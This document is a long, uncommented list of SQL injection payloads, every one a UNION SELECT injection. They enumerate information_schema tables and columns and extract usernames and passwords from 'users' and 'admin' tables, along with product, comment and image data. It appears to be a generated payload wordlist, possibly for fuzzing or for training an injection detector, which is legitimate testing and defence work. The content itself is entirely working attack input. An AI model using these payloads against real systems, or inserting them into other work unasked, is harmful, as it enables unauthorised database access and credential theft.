1' UNION SELECT name ,type ,price ,NULL FROM products WHERE price <>'
1' UNION SELECT CHARACTER_OCTET_LENGTH ,CHARACTER_OCTET_LENGTH ,NUMERIC_SCALE ,TABLE_CATALOG FROM information_schema.columns WHERE PRIVILEGES ='1
1' UNION SELECT password ,NULL ,NULL ,id FROM users WHERE username <>'
1' UNION SELECT AUTO_INCREMENT ,TABLE_NAME ,AUTO_INCREMENT ,CREATE_TIME FROM information_schema.tables WHERE ROW_FORMAT ='1
1' UNION SELECT images ,NULL ,NULL ,images FROM image WHERE images <>'
1' UNION SELECT TABLE_NAME ,ENGINE ,CHECKSUM ,TABLE_TYPE FROM information_schema.tables WHERE AUTO_INCREMENT ='1
1' UNION SELECT DATA_TYPE ,DATETIME_PRECISION ,GENERATION_EXPRESSION ,COLUMN_DEFAULT FROM information_schema.columns WHERE COLUMN_NAME ='1
1' UNION SELECT price ,id ,NULL ,type FROM products WHERE name ='1
1' UNION SELECT password ,NULL ,id ,id FROM admin WHERE username <>'
1' UNION SELECT username ,id ,NULL ,NULL FROM admin WHERE password ='1
1' UNION SELECT images ,NULL ,NULL ,images FROM image WHERE images <>'
1' UNION SELECT price ,type ,NULL ,NULL FROM products WHERE name <>'
1' UNION SELECT name ,description ,NULL ,id FROM types WHERE description ='1
1' UNION SELECT images ,images ,images ,images FROM image WHERE images ='1
1' UNION SELECT price ,name ,name ,NULL FROM products WHERE id <>'
1' UNION SELECT TABLE_CATALOG ,ORDINAL_POSITION ,SRS_ID ,COLUMN_KEY FROM information_schema.columns WHERE PRIVILEGES ='1
1' UNION SELECT images ,NULL ,images ,NULL FROM image WHERE images ='1
1' UNION SELECT CREATE_TIME ,DATA_FREE ,AUTO_INCREMENT ,UPDATE_TIME FROM information_schema.tables WHERE TABLE_COLLATION ='1
1' UNION SELECT NULL ,comment ,NULL ,name FROM commentsnew WHERE name ='1
1' UNION SELECT id ,password ,password ,password FROM admin WHERE id <>'
1' UNION SELECT INDEX_LENGTH ,VERSION ,VERSION ,VERSION FROM information_schema.tables WHERE TABLE_NAME ='1
1' UNION SELECT images ,images ,NULL ,images FROM image WHERE images ='1
1' UNION SELECT NULL ,NULL ,name ,type FROM products WHERE type ='1
1' UNION SELECT password ,id ,username ,username FROM admin WHERE id ='1
1' UNION SELECT COLUMN_TYPE ,COLUMN_COMMENT ,GENERATION_EXPRESSION ,TABLE_NAME FROM information_schema.columns WHERE COLUMN_NAME ='1
1' UNION SELECT NULL ,id ,id ,id FROM products WHERE name ='1
1' UNION SELECT id ,username ,id ,username FROM users WHERE password <>'
1' UNION SELECT ORDINAL_POSITION ,COLUMN_NAME ,NUMERIC_PRECISION ,NUMERIC_SCALE FROM information_schema.columns WHERE CHARACTER_OCTET_LENGTH ='1
1' UNION SELECT AUTO_INCREMENT ,UPDATE_TIME ,DATA_LENGTH ,VERSION FROM information_schema.tables WHERE CREATE_TIME ='1
1' UNION SELECT name ,type ,NULL ,NULL FROM products WHERE id ='1
1' UNION SELECT type ,name ,NULL ,NULL FROM products WHERE price ='1
1' UNION SELECT NULL ,NULL ,NULL ,name FROM commentsnew WHERE comment <>'
1' UNION SELECT NULL ,NULL ,type ,price FROM products WHERE type ='1
1' UNION SELECT price ,id ,id ,NULL FROM products WHERE id ='1
1' UNION SELECT password ,password ,password ,password FROM admin WHERE username <>'
1' UNION SELECT NULL ,username ,username ,id FROM admin WHERE username <>'
1' UNION SELECT AVG_ROW_LENGTH ,VERSION ,CHECKSUM ,INDEX_LENGTH FROM information_schema.tables WHERE INDEX_LENGTH ='1
1' UNION SELECT name ,name ,NULL ,comment FROM commentsnew WHERE name <>'
1' UNION SELECT comment ,comment ,name ,NULL FROM commentsnew WHERE name ='1
1' UNION SELECT NULL ,NULL ,NULL ,NULL FROM products WHERE type <>'
1' UNION SELECT comment ,name ,name ,name FROM commentsnew WHERE name <>'
1' UNION SELECT description ,name ,name ,id FROM types WHERE id ='1
1' UNION SELECT id ,id ,id ,username FROM admin WHERE password ='1
1' UNION SELECT id ,description ,name ,name FROM types WHERE description ='1
1' UNION SELECT name ,comment ,comment ,NULL FROM commentsnew WHERE comment ='1
1' UNION SELECT INDEX_LENGTH ,VERSION ,UPDATE_TIME ,TABLE_SCHEMA FROM information_schema.tables WHERE TABLE_NAME ='1
1' UNION SELECT comment ,name ,name ,name FROM commentsnew WHERE comment <>'
1' UNION SELECT comment ,name ,name ,name FROM commentsnew WHERE name ='1
1' UNION SELECT TABLE_CATALOG ,TABLE_TYPE ,TABLE_SCHEMA ,CREATE_OPTIONS FROM information_schema.tables WHERE UPDATE_TIME ='1
1' UNION SELECT NULL ,NULL ,images ,images FROM image WHERE images <>'
1' UNION SELECT AUTO_INCREMENT ,TABLE_ROWS ,CREATE_TIME ,CREATE_TIME FROM information_schema.tables WHERE DATA_LENGTH <>'
1' UNION SELECT NULL ,name ,name ,NULL FROM commentsnew WHERE comment <>'
1' UNION SELECT name ,name ,comment ,comment FROM commentsnew WHERE name ='1
1' UNION SELECT PRIVILEGES ,TABLE_SCHEMA ,TABLE_SCHEMA ,ORDINAL_POSITION FROM information_schema.columns WHERE COLUMN_COMMENT ='1
1' UNION SELECT username ,password ,username ,id FROM admin WHERE password ='1
1' UNION SELECT NULL ,NULL ,name ,name FROM commentsnew WHERE comment <>'
1' UNION SELECT CHARACTER_MAXIMUM_LENGTH ,PRIVILEGES ,TABLE_NAME ,EXTRA FROM information_schema.columns WHERE CHARACTER_MAXIMUM_LENGTH ='1
1' UNION SELECT id ,NULL ,username ,NULL FROM admin WHERE username ='1
1' UNION SELECT id ,password ,NULL ,password FROM users WHERE password <>'
1' UNION SELECT id ,NULL ,description ,NULL FROM types WHERE description <>'
1' UNION SELECT NULL ,NULL ,NULL ,images FROM image WHERE images ='1
1' UNION SELECT password ,id ,username ,NULL FROM users WHERE id <>'
1' UNION SELECT images ,images ,images ,NULL FROM image WHERE images <>'
1' UNION SELECT NULL ,NULL ,NULL ,images FROM image WHERE images <>'
1' UNION SELECT INDEX_LENGTH ,CHECK_TIME ,ROW_FORMAT ,DATA_FREE FROM information_schema.tables WHERE INDEX_LENGTH ='1
1' UNION SELECT type ,type ,id ,NULL FROM products WHERE price ='1
1' UNION SELECT NUMERIC_PRECISION ,ORDINAL_POSITION ,COLUMN_DEFAULT ,SRS_ID FROM information_schema.columns WHERE COLUMN_COMMENT <>'
1' UNION SELECT images ,NULL ,images ,images FROM image WHERE images ='1
1' UNION SELECT images ,NULL ,NULL ,NULL FROM image WHERE images ='1
1' UNION SELECT GENERATION_EXPRESSION ,NUMERIC_SCALE ,COLUMN_NAME ,CHARACTER_SET_NAME FROM information_schema.columns WHERE SRS_ID ='1
1' UNION SELECT username ,NULL ,username ,password FROM admin WHERE password ='1
1' UNION SELECT username ,NULL ,username ,password FROM admin WHERE password ='1
1' UNION SELECT name ,id ,id ,description FROM types WHERE id <>'
1' UNION SELECT comment ,NULL ,NULL ,NULL FROM commentsnew WHERE comment <>'
1' UNION SELECT password ,id ,NULL ,username FROM admin WHERE id <>'
1' UNION SELECT NULL ,images ,images ,images FROM image WHERE images <>'
1' UNION SELECT CHARACTER_OCTET_LENGTH ,COLUMN_COMMENT ,NUMERIC_SCALE ,NULL FROM information_schema.columns WHERE SRS_ID ='1
1' UNION SELECT COLUMN_TYPE ,COLUMN_NAME ,NUMERIC_SCALE ,DATETIME_PRECISION FROM information_schema.columns WHERE TABLE_NAME ='1
1' UNION SELECT IS_NULLABLE ,GENERATION_EXPRESSION ,CHARACTER_SET_NAME ,PRIVILEGES FROM information_schema.columns WHERE NUMERIC_PRECISION ='1
1' UNION SELECT id ,password ,username ,password FROM admin WHERE username <>'
1' UNION SELECT images ,images ,images ,NULL FROM image WHERE images <>'
1' UNION SELECT CHECKSUM ,TABLE_COMMENT ,CREATE_TIME ,TABLE_COLLATION FROM information_schema.tables WHERE VERSION ='1
1' UNION SELECT name ,comment ,comment ,comment FROM commentsnew WHERE name ='1
1' UNION SELECT TABLE_TYPE ,NULL ,MAX_DATA_LENGTH ,VERSION FROM information_schema.tables WHERE TABLE_COMMENT <>'
1' UNION SELECT id ,description ,description ,name FROM types WHERE description <>'
1' UNION SELECT username ,id ,password ,id FROM users WHERE id <>'
1' UNION SELECT type ,id ,id ,name FROM products WHERE price <>'
1' UNION SELECT username ,id ,username ,id FROM users WHERE password <>'
1' UNION SELECT CHARACTER_MAXIMUM_LENGTH ,NULL ,COLUMN_KEY ,PRIVILEGES FROM information_schema.columns WHERE DATA_TYPE <>'
1' UNION SELECT id ,NULL ,id ,id FROM users WHERE id ='1
1' UNION SELECT type ,NULL ,type ,NULL FROM products WHERE id <>'
1' UNION SELECT VERSION ,UPDATE_TIME ,TABLE_COMMENT ,INDEX_LENGTH FROM information_schema.tables WHERE TABLE_TYPE ='1
1' UNION SELECT images ,images ,images ,NULL FROM image WHERE images <>'
1' UNION SELECT DATA_FREE ,TABLE_TYPE ,TABLE_COLLATION ,CREATE_TIME FROM information_schema.tables WHERE VERSION <>'
1' UNION SELECT name ,id ,id ,id FROM products WHERE name ='1
1' UNION SELECT DATETIME_PRECISION ,DATA_TYPE ,COLUMN_DEFAULT ,TABLE_SCHEMA FROM information_schema.columns WHERE COLUMN_KEY <>'
1' UNION SELECT NULL ,images ,images ,NULL FROM image WHERE images <>'
1' UNION SELECT images ,images ,images ,NULL FROM image WHERE images <>'
1' UNION SELECT DATA_TYPE ,COLUMN_TYPE ,CHARACTER_MAXIMUM_LENGTH ,TABLE_SCHEMA FROM information_schema.columns WHERE CHARACTER_OCTET_LENGTH ='1
1' UNION SELECT AUTO_INCREMENT ,TABLE_TYPE ,DATA_LENGTH ,ROW_FORMAT FROM information_schema.tables WHERE TABLE_ROWS <>'
1' UNION SELECT NULL ,password ,id ,username FROM users WHERE id ='1
1' UNION SELECT TABLE_CATALOG ,CHECK_TIME ,VERSION ,CHECKSUM FROM information_schema.tables WHERE TABLE_ROWS <>'
1' UNION SELECT NULL ,NULL ,NULL ,name FROM types WHERE id ='1
1' UNION SELECT password ,username ,password ,NULL FROM admin WHERE password <>'
1' UNION SELECT id ,price ,price ,id FROM products WHERE type ='1
1' UNION SELECT id ,id ,password ,NULL FROM users WHERE id ='1
1' UNION SELECT NULL ,DATA_LENGTH ,VERSION ,CREATE_TIME FROM information_schema.tables WHERE UPDATE_TIME <>'
1' UNION SELECT ENGINE ,TABLE_TYPE ,NULL ,AUTO_INCREMENT FROM information_schema.tables WHERE ENGINE <>'
1' UNION SELECT password ,NULL ,username ,password FROM admin WHERE password <>'
1' UNION SELECT NULL ,images ,images ,images FROM image WHERE images <>'
1' UNION SELECT images ,NULL ,images ,images FROM image WHERE images <>'
1' UNION SELECT images ,images ,NULL ,images FROM image WHERE images <>'
1' UNION SELECT images ,NULL ,NULL ,NULL FROM image WHERE images ='1
1' UNION SELECT password ,id ,username ,NULL FROM admin WHERE username ='1
1' UNION SELECT password ,id ,NULL ,NULL FROM admin WHERE username ='1
1' UNION SELECT name ,NULL ,NULL ,name FROM commentsnew WHERE name ='1
1' UNION SELECT password ,password ,username ,password FROM users WHERE password ='1
1' UNION SELECT NULL ,images ,images ,images FROM image WHERE images <>'
1' UNION SELECT password ,id ,password ,password FROM users WHERE password <>'
1' UNION SELECT name ,NULL ,type ,price FROM products WHERE name <>'
1' UNION SELECT NULL ,username ,id ,username FROM users WHERE username ='1
1' UNION SELECT id ,NULL ,id ,id FROM types WHERE description ='1
1' UNION SELECT type ,NULL ,NULL ,name FROM products WHERE price <>'
1' UNION SELECT username ,password ,password ,username FROM admin WHERE username <>'
1' UNION SELECT description ,NULL ,description ,description FROM types WHERE id ='1
1' UNION SELECT comment ,name ,comment ,name FROM commentsnew WHERE name ='1
1' UNION SELECT COLUMN_NAME ,COLUMN_TYPE ,GENERATION_EXPRESSION ,NUMERIC_SCALE FROM information_schema.columns WHERE COLUMN_DEFAULT ='1
1' UNION SELECT TABLE_SCHEMA ,ENGINE ,TABLE_NAME ,DATA_LENGTH FROM information_schema.tables WHERE ENGINE ='1
1' UNION SELECT username ,password ,NULL ,username FROM admin WHERE password ='1
1' UNION SELECT images ,images ,NULL ,images FROM image WHERE images ='1
1' UNION SELECT type ,price ,name ,id FROM products WHERE price <>'
1' UNION SELECT TABLE_TYPE ,DATA_LENGTH ,TABLE_ROWS ,INDEX_LENGTH FROM information_schema.tables WHERE ROW_FORMAT <>'
1' UNION SELECT price ,type ,type ,id FROM products WHERE name ='1
1' UNION SELECT password ,NULL ,username ,id FROM users WHERE username <>'
1' UNION SELECT name ,name ,NULL ,name FROM types WHERE id ='1
1' UNION SELECT id ,name ,id ,id FROM types WHERE description <>'
1' UNION SELECT NULL ,NULL ,NULL ,images FROM image WHERE images ='1
1' UNION SELECT name ,description ,description ,description FROM types WHERE description ='1
1' UNION SELECT UPDATE_TIME ,INDEX_LENGTH ,TABLE_NAME ,DATA_LENGTH FROM information_schema.tables WHERE TABLE_ROWS ='1
1' UNION SELECT NULL ,username ,username ,NULL FROM admin WHERE id ='1
1' UNION SELECT id ,NULL ,id ,username FROM admin WHERE username ='1
1' UNION SELECT type ,id ,NULL ,NULL FROM products WHERE price <>'
1' UNION SELECT NULL ,NULL ,NULL ,password FROM users WHERE username <>'
1' UNION SELECT images ,images ,images ,NULL FROM image WHERE images <>'
1' UNION SELECT id ,NULL ,name ,name FROM products WHERE price ='1
1' UNION SELECT NULL ,NULL ,NULL ,NULL FROM image WHERE images ='1
1' UNION SELECT ORDINAL_POSITION ,COLUMN_COMMENT ,EXTRA ,NUMERIC_SCALE FROM information_schema.columns WHERE DATETIME_PRECISION <>'
1' UNION SELECT username ,NULL ,username ,username FROM admin WHERE username <>'
1' UNION SELECT id ,id ,name ,price FROM products WHERE price <>'
1' UNION SELECT id ,id ,NULL ,id FROM users WHERE id ='1
1' UNION SELECT type ,price ,NULL ,id FROM products WHERE id ='1
1' UNION SELECT id ,NULL ,name ,name FROM types WHERE name <>'
1' UNION SELECT images ,NULL ,images ,NULL FROM image WHERE images <>'
1' UNION SELECT description ,NULL ,NULL ,name FROM types WHERE name ='1
1' UNION SELECT comment ,NULL ,name ,name FROM commentsnew WHERE comment ='1
1' UNION SELECT name ,id ,name ,NULL FROM types WHERE id <>'
1' UNION SELECT NULL ,name ,name ,comment FROM commentsnew WHERE name <>'
1' UNION SELECT NULL ,NULL ,NULL ,images FROM image WHERE images ='1
1' UNION SELECT COLLATION_NAME ,PRIVILEGES ,DATA_TYPE ,EXTRA FROM information_schema.columns WHERE COLLATION_NAME ='1
1' UNION SELECT comment ,name ,NULL ,name FROM commentsnew WHERE name ='1
1' UNION SELECT CREATE_OPTIONS ,UPDATE_TIME ,UPDATE_TIME ,NULL FROM information_schema.tables WHERE UPDATE_TIME <>'
1' UNION SELECT password ,username ,id ,password FROM users WHERE username ='1
1' UNION SELECT type ,name ,type ,id FROM products WHERE type ='1
1' UNION SELECT MAX_DATA_LENGTH ,CHECKSUM ,VERSION ,VERSION FROM information_schema.tables WHERE AVG_ROW_LENGTH <>'
1' UNION SELECT TABLE_CATALOG ,NUMERIC_PRECISION ,COLLATION_NAME ,COLUMN_NAME FROM information_schema.columns WHERE TABLE_NAME ='1
1' UNION SELECT name ,NULL ,name ,id FROM types WHERE name ='1
1' UNION SELECT username ,NULL ,NULL ,NULL FROM admin WHERE username ='1
1' UNION SELECT username ,NULL ,id ,id FROM admin WHERE id ='1
1' UNION SELECT NULL ,price ,price ,price FROM products WHERE type <>'
1' UNION SELECT type ,NULL ,NULL ,NULL FROM products WHERE name <>'
1' UNION SELECT DATA_TYPE ,IS_NULLABLE ,COLUMN_KEY ,COLUMN_DEFAULT FROM information_schema.columns WHERE CHARACTER_MAXIMUM_LENGTH ='1
1' UNION SELECT NULL ,price ,NULL ,id FROM products WHERE name ='1
1' UNION SELECT COLUMN_COMMENT ,NUMERIC_PRECISION ,COLUMN_KEY ,COLUMN_TYPE FROM information_schema.columns WHERE TABLE_CATALOG <>'
1' UNION SELECT CREATE_OPTIONS ,TABLE_SCHEMA ,TABLE_SCHEMA ,ENGINE FROM information_schema.tables WHERE AVG_ROW_LENGTH <>'
1' UNION SELECT username ,NULL ,id ,id FROM admin WHERE id ='1
1' UNION SELECT DATA_FREE ,CHECKSUM ,CREATE_TIME ,ENGINE FROM information_schema.tables WHERE VERSION ='1
1' UNION SELECT description ,NULL ,NULL ,name FROM types WHERE id <>'
1' UNION SELECT NULL ,NULL ,NULL ,NULL FROM image WHERE images <>'
1' UNION SELECT username ,password ,NULL ,id FROM users WHERE id ='1
1' UNION SELECT description ,description ,name ,name FROM types WHERE id ='1
1' UNION SELECT id ,username ,username ,username FROM users WHERE username ='1
1' UNION SELECT price ,id ,name ,NULL FROM products WHERE id <>'
1' UNION SELECT NULL ,NULL ,images ,images FROM image WHERE images <>'
1' UNION SELECT MAX_DATA_LENGTH ,NULL ,CHECKSUM ,ENGINE FROM information_schema.tables WHERE MAX_DATA_LENGTH ='1
1' UNION SELECT id ,username ,password ,username FROM users WHERE username ='1
1' UNION SELECT password ,username ,NULL ,NULL FROM admin WHERE password <>'
1' UNION SELECT password ,NULL ,username ,id FROM users WHERE username ='1
1' UNION SELECT NULL ,NULL ,NULL ,images FROM image WHERE images <>'
1' UNION SELECT description ,NULL ,id ,description FROM types WHERE description <>'
1' UNION SELECT DATA_FREE ,TABLE_SCHEMA ,TABLE_ROWS ,TABLE_COLLATION FROM information_schema.tables WHERE DATA_FREE <>'
1' UNION SELECT price ,type ,NULL ,type FROM products WHERE name ='1
1' UNION SELECT comment ,name ,NULL ,NULL FROM commentsnew WHERE name ='1
1' UNION SELECT NULL ,TABLE_COLLATION ,UPDATE_TIME ,UPDATE_TIME FROM information_schema.tables WHERE DATA_FREE ='1
1' UNION SELECT NULL ,TABLE_CATALOG ,IS_NULLABLE ,TABLE_CATALOG FROM information_schema.columns WHERE COLUMN_NAME ='1
1' UNION SELECT comment ,NULL ,comment ,NULL FROM commentsnew WHERE name <>'
1' UNION SELECT TABLE_NAME ,NUMERIC_PRECISION ,COLUMN_COMMENT ,DATETIME_PRECISION FROM information_schema.columns WHERE TABLE_SCHEMA <>'
1' UNION SELECT NULL ,name ,comment ,name FROM commentsnew WHERE name ='1
1' UNION SELECT name ,name ,price ,price FROM products WHERE price ='1
1' UNION SELECT images ,NULL ,images ,images FROM image WHERE images ='1
1' UNION SELECT NULL ,password ,id ,id FROM admin WHERE password ='1
1' UNION SELECT id ,username ,NULL ,username FROM admin WHERE username ='1
1' UNION SELECT NULL ,NULL ,username ,password FROM admin WHERE password <>'
1' UNION SELECT NULL ,NULL ,description ,NULL FROM types WHERE description ='1
1' UNION SELECT username ,id ,username ,id FROM users WHERE id <>'
1' UNION SELECT username ,password ,password ,id FROM users WHERE password ='1
1' UNION SELECT CREATE_OPTIONS ,CREATE_OPTIONS ,MAX_DATA_LENGTH ,CHECKSUM FROM information_schema.tables WHERE TABLE_CATALOG <>'
1' UNION SELECT NULL ,images ,NULL ,images FROM image WHERE images <>'
1' UNION SELECT id ,name ,NULL ,NULL FROM types WHERE description ='1
1' UNION SELECT CHARACTER_OCTET_LENGTH ,ORDINAL_POSITION ,COLUMN_COMMENT ,COLUMN_NAME FROM information_schema.columns WHERE COLUMN_COMMENT ='1
1' UNION SELECT COLUMN_COMMENT ,CHARACTER_SET_NAME ,TABLE_NAME ,TABLE_SCHEMA FROM information_schema.columns WHERE COLUMN_KEY ='1
1' UNION SELECT NULL ,username ,id ,username FROM users WHERE username <>'
1' UNION SELECT id ,NULL ,NULL ,name FROM types WHERE id <>'
1' UNION SELECT NULL ,description ,id ,NULL FROM types WHERE id ='1
1' UNION SELECT images ,NULL ,images ,images FROM image WHERE images <>'
1' UNION SELECT COLUMN_KEY ,DATA_TYPE ,COLUMN_TYPE ,PRIVILEGES FROM information_schema.columns WHERE CHARACTER_OCTET_LENGTH <>'
1' UNION SELECT COLUMN_TYPE ,CHARACTER_OCTET_LENGTH ,COLUMN_KEY ,COLUMN_KEY FROM information_schema.columns WHERE COLLATION_NAME <>'
1' UNION SELECT NULL ,NULL ,name ,id FROM types WHERE name <>'
1' UNION SELECT id ,username ,password ,password FROM users WHERE password <>'
1' UNION SELECT NULL ,NULL ,images ,images FROM image WHERE images <>'
1' UNION SELECT id ,name ,price ,name FROM products WHERE price <>'
1' UNION SELECT password ,NULL ,password ,username FROM users WHERE password <>'
1' UNION SELECT images ,NULL ,NULL ,NULL FROM image WHERE images ='1
1' UNION SELECT id ,password ,username ,username FROM admin WHERE password <>'
1' UNION SELECT username ,id ,password ,id FROM users WHERE password ='1
1' UNION SELECT username ,password ,username ,username FROM users WHERE id <>'
1' UNION SELECT id ,NULL ,price ,name FROM products WHERE id ='1
1' UNION SELECT username ,username ,id ,username FROM admin WHERE password <>'
1' UNION SELECT images ,NULL ,images ,NULL FROM image WHERE images <>'
1' UNION SELECT comment ,comment ,NULL ,NULL FROM commentsnew WHERE name <>'
